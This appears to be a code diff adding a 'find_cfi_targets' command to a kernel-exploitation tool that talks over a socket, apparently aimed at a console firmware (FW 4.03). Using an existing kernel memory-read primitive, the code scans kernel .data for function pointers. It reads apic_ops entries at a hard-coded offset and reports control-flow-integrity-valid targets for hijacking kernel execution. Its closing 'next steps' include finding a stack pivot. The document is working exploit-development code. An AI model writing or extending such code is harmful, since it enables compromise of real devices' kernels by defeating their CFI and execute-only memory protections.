@@ -2102,6 +2102,156 @@ cmd_analyze_apic_ops(int sock, const char *args)
     send_response(sock, "OK\n");
 }
 
+/*
+ * find_cfi_targets - Find CFI-valid void(*)(void) function targets
+ *
+ * Since .text is XOM we can't scan for gadgets directly. Instead, we collect
+ * all unique function pointers from ops tables in .data. Functions used as
+ * void(*)(void) entries share the same Clang CFI type hash as xapic_mode,
+ * making them valid replacement targets.
+ *
+ * Strategy:
+ * 1. Scan .data for function pointer tables (like scan_apic_ops)
+ * 2. For each table, collect entries at indices known to be void(*)(void)
+ * 3. Also collect ALL unique .text pointers as potential targets
+ * 4. Report sorted by .text offset for cross-referencing
+ */
+static void
+cmd_find_cfi_targets(int sock)
+{
+    intptr_t kdata_base = KERNEL_ADDRESS_DATA_BASE;
+    intptr_t ktext_base = KERNEL_ADDRESS_TEXT_BASE;
+    uint64_t text_start = (uint64_t)ktext_base;
+    uint64_t text_end = text_start + 0x1000000;
+    uint64_t scan_start = (uint64_t)kdata_base;
+    uint64_t scan_size = 0x1000000;  /* 16MB of .data */
+
+    send_response(sock, "=== Finding CFI-valid targets for void(*)(void) ===\n\n");
+
+    /*
+     * Phase 1: Collect unique .text pointers from .data with ref counts.
+     * Max 4096 unique pointers should be plenty.
+     */
+    #define MAX_TARGETS 4096
+    uint64_t *targets = __builtin_alloca(MAX_TARGETS * sizeof(uint64_t));
+    int *refcounts = __builtin_alloca(MAX_TARGETS * sizeof(int));
+    int num_targets = 0;
+
+    send_response(sock, "Scanning 16MB of .data for .text pointers...\n");
+
+    uint64_t addr = scan_start;
+    uint8_t buf[4096];
+
+    while (addr < scan_start + scan_size) {
+        if (kernel_copyout(addr, buf, sizeof(buf)) != 0) {
+            addr += sizeof(buf);
+            continue;
+        }
+
+        for (int i = 0; i <= (int)sizeof(buf) - 8; i += 8) {
+            uint64_t val;
+            memcpy(&val, buf + i, 8);
+
+            if (val >= text_start && val < text_end) {
+                /* Check for duplicate, increment refcount */
+                int found = -1;
+                for (int j = 0; j < num_targets; j++) {
+                    if (targets[j] == val) {
+                        found = j;
+                        break;
+                    }
+                }
+                if (found >= 0) {
+                    refcounts[found]++;
+                } else if (num_targets < MAX_TARGETS) {
+                    targets[num_targets] = val;
+                    refcounts[num_targets] = 1;
+                    num_targets++;
+                }
+            }
+        }
+        addr += sizeof(buf);
+    }
+
+    send_response(sock, "Found %d unique .text pointers in .data\n\n", num_targets);
+
+    /* Sort by address using simple insertion sort (move refcounts too) */
+    for (int i = 1; i < num_targets; i++) {
+        uint64_t key = targets[i];
+        int key_ref = refcounts[i];
+        int j = i - 1;
+        while (j >= 0 && targets[j] > key) {
+            targets[j + 1] = targets[j];
+            refcounts[j + 1] = refcounts[j];
+            j--;
+        }
+        targets[j + 1] = key;
+        refcounts[j + 1] = key_ref;
+    }
+
+    /*
+     * Phase 2: Identify likely void(*)(void) targets
+     *
+     * In apic_ops, these indices are void(*)(void):
+     *   [2] xapic_mode, [6] disable, [7] eoi
+     *
+     * We know the apic_ops at kdata+0x179180. Read those specific entries
+     * as confirmed void(*)(void) targets.
+     */
+    send_response(sock, "--- Confirmed void(*)(void) from apic_ops ---\n");
+
+    uint64_t apic_ops_va = (uint64_t)kdata_base + 0x179180;
+    /* Indices known to be void(*)(void): xapic_mode, disable, eoi */
+    int void_indices[] = {2, 6, 7};
+    int num_void = sizeof(void_indices) / sizeof(void_indices[0]);
+
+    for (int v = 0; v < num_void; v++) {
+        uint64_t fptr;
+        if (kernel_copyout(apic_ops_va + void_indices[v] * 8, &fptr, 8) == 0) {
+            if (fptr >= text_start && fptr < text_end) {
+                send_response(sock, "  apic_ops[%d] = ktext+0x%lx  (confirmed void(*)(void))\n",
+                              void_indices[v], fptr - text_start);
+            }
+        }
+    }
+
+    /*
+     * Phase 3: Show frequently-referenced .text functions (3+ refs)
+     * Functions appearing many times in .data are likely common ops callbacks.
+     * Uses refcounts collected during Phase 1 scan (no re-scanning).
+     */
+    send_response(sock, "\n--- Frequently referenced .text functions (3+ refs) ---\n");
+    send_response(sock, "(Functions used in multiple places more likely to be simple callbacks)\n\n");
+
+    int freq_count = 0;
+    for (int i = 0; i < num_targets; i++) {
+        if (refcounts[i] >= 3) {
+            send_response(sock, "  ktext+0x%06lx  refs=%d\n",
+                          targets[i] - text_start, refcounts[i]);
+            freq_count++;
+        }
+    }
+    send_response(sock, "Total: %d frequently-referenced functions\n", freq_count);
+
+    /*
+     * Phase 4: Summary of all unique .text targets
+     */
+    send_response(sock, "\n--- All unique .text pointers (%d total) ---\n", num_targets);
+    send_response(sock, "(Sorted by ktext offset, any could be a CFI target)\n\n");
+
+    for (int i = 0; i < num_targets; i++) {
+        uint64_t off = targets[i] - text_start;
+        send_response(sock, "  ktext+0x%06lx\n", off);
+    }
+
+    send_response(sock, "\n--- Next steps ---\n");
+    send_response(sock, "1. Confirmed void(*)(void): apic_ops entries [2],[6],[7]\n");
+    send_response(sock, "2. Any function above could pass CFI if type-hash matches\n");
+    send_response(sock, "3. For stack pivot: need func that uses controlled reg as memop\n");
+    send_response(sock, "4. Cross-ref offsets with known FW 4.03 kernel binary\n");
+    send_response(sock, "OK\n");
+}
+
 /* Display kernel information */
 static void
 cmd_kinfo(int sock) {
@@ -2262,6 +2412,8 @@ handle_command(int sock, char *cmd) {
         cmd_identify_table(sock, cmd + 15);
     } else if (strncmp(cmd, "analyze_apic_ops ", 17) == 0) {
         cmd_analyze_apic_ops(sock, cmd + 17);
+    } else if (strcmp(cmd, "find_cfi_targets") == 0) {
+        cmd_find_cfi_targets(sock);
     } else if (strcmp(cmd, "exit") == 0 || strcmp(cmd, "quit") == 0) {
         send_response(sock, "Goodbye!\n");
         return -1;
@@ -2292,6 +2444,7 @@ handle_command(int sock, char *cmd) {
         send_response(sock, "scan_apic_ops [min]      - Find function pointer tables\n");
         send_response(sock, "identify_table <off> [ctx] - Identify func ptr table (kdata offset)\n");
         send_response(sock, "analyze_apic_ops <off>   - Full apic_ops analysis (36 entries)\n");
+        send_response(sock, "find_cfi_targets         - Find CFI-valid function targets\n");
         send_response(sock, "\nexit                     - Close connection\n");
         send_response(sock, "help                     - Show this help\n");
     } else {
